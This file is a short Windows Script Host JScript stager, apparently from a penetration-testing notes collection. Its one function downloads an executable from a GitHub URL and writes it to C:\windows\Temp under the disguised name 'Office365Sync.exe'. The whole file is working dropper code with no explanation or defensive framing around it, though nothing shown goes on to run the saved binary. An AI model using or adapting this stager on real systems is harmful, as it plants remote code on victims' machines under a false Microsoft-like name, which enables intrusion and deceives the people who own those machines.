function stage() {
	var url = "https://github.com/initinfosec/notes-and-refs-public/raw/master/misc_resources/testDebugMsg.exe",
	filename = "C:\\windows\\Temp\\Office365Sync.exe",
	fso = WScript.CreateObject('Scripting.FileSystemObject'),
	request, stream;
	if (fso.FileExists(filename)) {
	WScript.Echo('Already got ' + filename);
	} else {
	WScript.Echo('Downloading ' + url);
	request = WScript.CreateObject('MSXML2.ServerXMLHTTP');
	request.open('GET', url, false); // not async
	request.send();
	if (request.status === 200) { // OK
		WScript.Echo("Size: " + request.getResponseHeader("Content-Length") + " bytes");
		stream = WScript.CreateObject('ADODB.Stream');
		stream.Open();
		stream.Type = 1; // adTypeBinary
		stream.Write(request.responseBody);
		stream.Position = 0; // rewind
		stream.SaveToFile(filename, 1); // adSaveCreateNotExist
		stream.Close();
		WScript.Echo('Done');
	} else {
		WScript.Echo('Failed');
		WScript.Quit(1);
	}
	}
     
}
stage();
